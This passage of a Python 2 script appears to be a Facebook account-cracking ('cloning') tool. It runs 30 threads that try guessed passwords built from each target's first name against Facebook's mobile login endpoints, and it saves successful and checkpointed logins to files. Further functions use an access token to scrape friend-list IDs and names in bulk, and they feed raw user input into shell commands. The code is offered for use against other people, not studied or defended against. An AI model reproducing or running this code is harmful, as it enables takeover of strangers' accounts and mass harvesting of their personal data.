    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mCloning Start Now please Wait ..'
    print '\x1b[1;91m[!]\x1b[1;97mFor Stop press ctrl+z...'
    print '\x1b[1;91m[!]\x1b[1;97mTurn on Flight Mode Every 5 mints for 5 Secnds'
    print '\x1b[1;97m------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        name = name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass

        lines = random.choice([
         'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]NokiaX2-00/5.0 (04.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://m.facebook.com')
            b = rana.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass1
                ok = open('RYDAH-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass1
                cp = open('RYDAH-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = first + '123'
                rana = requests.Session()
                rana.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = rana.get('https://m.facebook.com')
                b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass2
                    ok = open('RYDAH-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass2
                    cp = open('RYDAH-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = first + 'last'
                    rana = requests.Session()
                    rana.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://m.facebook.com')
                    b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass3
                        ok = open('RYDAH-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass3
                        cp = open('RYDAH-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = first + '12345'
                        rana = requests.Session()
                        rana.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = rana.get('https://m.facebook.com')
                        b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass4
                            ok = open('RYDAH-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass4
                            cp = open('RYDAH-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = first + '786'
                            rana = requests.Session()
                            rana.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://m.facebook.com')
                            b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[RYDAH-OK] ' + uid + ' | ' + pass5
                                ok = open('RYDAH-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[RYDAH-CP] ' + uid + ' | ' + pass5
                                cp = open('RYDAH-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, idx)
    print '\x1b[1;97m'
    print '\x1b[1;91m[!]\x1b[1;97m Cloning Complete Result ........'
    print '\x1b[1;97m------------------------------------------------'
    print '\x1b[1;91m[!]\x1b[1;97mTotal ok ids : ' + str(len(cps))
    print '\x1b[1;91m[!]\x1b[1;97mTotal cp ids : ' + str(len(oks))
    print '\x1b[1;97m------------------------------------------------'
    print ''
    raw_input(' Press enter to back ')
    menu3()


def grab_auto():
    try:
        access_token = open('.access_token.txt', 'r').read()
    except:
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()

    os.system('clear')
    print logo
    print '  Logged user: ' + uname
    print 50 * '-'
    nusrat = []
    try:
        limit_user = int(raw_input('  How many ids do you want to add ? '))
    except:
        limit_user = 1

    count = 0
    for fir in range(limit_user):
        count += 1
        udit = raw_input('  Put id%s: ' % count)
        try:
            fr = requests.get('https://graph.facebook.com/' + udit + '/friends?access_token=' + access_token).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids + '\n')

            temp_save.close()
        except:
            if 'invalid' in str(qfr):
                print '  Logged token has expired .'
                raw_input('  Press enter to back ')
                time.sleep(1)
                os.system('rm -rf .access_token.txt')
                login()
            else:
                print '  No friends found for user: ' + udit

    os.system('clear')
    print logo
    print '   Total ids: ' + str(len(nusrat))
    print 50 * '-'
    try:
        ask_link = int(raw_input('  How many links do you want to Extraxt? '))
    except:
        ask_link = 1

    completed = 0
    for links in range(ask_link):
        completed += 1
        li = raw_input('  %s Link start with: ' % completed)
        os.system('cat temp.txt | grep "' + li + '" >> temp2.txt')

    save_file = raw_input('  Save file as: ')
    os.system('sort -r temp2.txt > temp3.txt && rm -rf temp2.txt')
    os.system('clear')
    lines = open('temp3.txt', 'r').readlines()
    print logo
    print '  Total ids to Dump: ' + str(len(lines))
    print '  Dump Process has started'
    print 50 * '-'
    fileid = 'temp3.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            rg = requests.get('https://graph.facebook.com/' + ids + '/friends?access_token=' + access_token).text
            rgq = json.loads(rg)
            idsave = open('/sdcard/' + save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                if uids in dill:
                    pass
                else:
                    dill.append(uids)
                    nm = inayat['name']
                    first_name = nm.split(' ')[0]
                    try:
                        last_name = nm.split(' ')[1]
                    except:
                        last_name = first_name

                    idsave.write(uids + '|' + first_name + ' ' + last_name + '\n')

            print '  Dump from: ' + ids
            print '  Token status: Live'
            print 50 * '-'
            idsave.close()
        except Exception as e:
            if 'invalid' in str(rgq):
                print '  Token has expired, try again ...'
                raw_input('   Press enter to back ')
                login()
            else:
                print '  Dump from: ' + ids
                print '  Friendlist ids: 0'
                print '  Token status: Expired'
                print 50 * '-'
                time.sleep(1)

    lenid = open('/sdcard/' + save_file, 'r').readlines()
    print '  Grabbing Process has completed '
    os.system('rm -rf temp*')
    print '  Total ids grabbed: ' + str(len(lenid))
    print '  File saved as: /sdcard/' + save_file
    print 50 * '-'
    raw_input('  Press enter to back ')
    s()


def grab_links():
    os.system('clear')
    print logo
    print ''
    try:
        limit = int(raw_input('   How many links do you want to Keep in File? '))
    except:
        limit = 1

    file_name = raw_input('   Input file name: ')
    new_save = raw_input('   Save new file as: ')
    y = 0
    for k in range(limit):
        y += 1
        links = raw_input('   Link Start With? %s: ' % y)
        os.system('cat ' + file_name + ' | grep "' + links + '" >> /sdcard/' + new_save)

    print 50 * '-'
    print '   Links grabbed successfully'
    print '   New file saved as: /sdcard/' + new_save
    print 50 * '-'
    raw_input('   Press enter to back ')
    s()


def login():
    os.system('clear')
    print logo
    tok = raw_input('   Put access token: ')
    try:
        u = requests.get('https://graph.facebook.com/me?access_token=' + tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('.access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print '   Logged in successfully'
        time.sleep(1)
        s()
    except KeyError:
        print '\n\x1b[1;31m   Invalid token provided, try again\x1b[0;97m'
        raw_input('   Press enter to back ')
        s()


if __name__ == '__main__':
    s
